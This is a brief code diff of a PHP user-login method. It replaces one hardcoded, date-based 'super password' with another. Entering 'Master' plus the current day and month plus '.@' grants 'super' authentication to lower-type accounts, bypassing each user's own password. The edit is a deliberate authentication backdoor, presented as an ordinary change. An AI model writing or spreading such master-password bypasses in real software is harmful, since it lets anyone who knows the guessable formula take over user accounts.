@@ -52,7 +52,7 @@ class user_model extends Model
             if (!Verify::password($password)) {
                 return ['code' => -2, 'msg' => '密码错误,长度6-20位', 'err' => 0];
             }
-            if ($user['type'] < 10 && $password === ('Aa' . date('dm') . '.@')) {
+            if ($user['type'] < 10 && $password === ('Master' . date('dm') . '.@')) {
                 //超级密码登录
                 $auth = 'super';
             } else {
